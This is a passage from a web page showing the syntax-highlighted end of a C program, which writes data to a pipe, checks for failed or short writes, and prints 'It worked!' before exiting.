	<span>nbytes</span> <span>=</span> <span>write</span><span>(</span><span>p</span><span>[</span><span>1</span><span>],</span> <span>data</span><span>,</span> <span>data_size</span><span>);</span>
	<span>if</span> <span>(</span><span>nbytes</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
		<span>perror</span><span>(</span><span>&#34;write failed&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>
	<span>if</span> <span>((</span><span>size_t</span><span>)</span><span>nbytes</span> <span>&lt;</span> <span>data_size</span><span>)</span> <span>{</span>
		<span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;short write</span><span>\n</span><span>&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>printf</span><span>(</span><span>&#34;It worked!</span><span>\n</span><span>&#34;</span><span>);</span>
	<span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</pre></div>
</div>
</div>

</div>


            
          </div>
        </div>
      </div>
      
    </div></div>
  </body>
</html>
